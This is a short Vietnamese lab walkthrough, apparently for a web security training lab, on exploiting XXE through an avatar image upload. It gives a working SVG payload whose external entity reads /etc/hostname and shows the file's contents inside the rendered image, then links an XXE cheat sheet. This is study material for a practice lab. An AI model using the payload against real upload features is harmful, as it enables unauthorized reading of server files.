## Exploiting XXE via image file upload

Nhìn tên lab thì chắc ai cũng biết chúng ta phải sử dụng upload img để tấn công XXE rồi :v

Do định dạng file ***.svg*** là 1 dạng của XML được sử dụng để mô tả hình ảnh thông qua element (code wpf là biết mà :v)

Ta sẽ inject vào phần update ảnh 1 file ***.svg*** với nội dung như sau

```XML
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
> Ta có thể lấy ra nội dung của entity ***xxe*** bằng cách gọi ra trong thẻ text của định dạng ***svg***

> [http://www.w3.org/2000/svg](http://www.w3.org/2000/svg) là namespace tiêu chuẩn của svg

Upload ảnh lên

![](/imgs/XXE/36.png?raw=true)

Mở cái avatar ra xem thì nó có nội dung như thế này.

![](/imgs/XXE/37.png?raw=true)

Chúng ta sẽ submit nội dung này vào là Solve Lab

![](/imgs/XXE/38.png?raw=true)

### Tài Liệu Tham Khảo
- Một số CheatSheet: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)

